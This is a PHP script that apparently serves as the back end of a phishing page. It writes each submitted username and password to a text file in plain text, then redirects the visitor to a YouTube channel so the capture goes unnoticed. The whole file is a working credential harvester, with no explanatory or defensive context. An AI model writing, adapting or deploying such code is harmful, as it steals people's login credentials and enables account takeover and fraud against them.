<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.youtube.com/channel/UC8zeiQkkcm3RB4Rdkmcf_iQ');
exit();
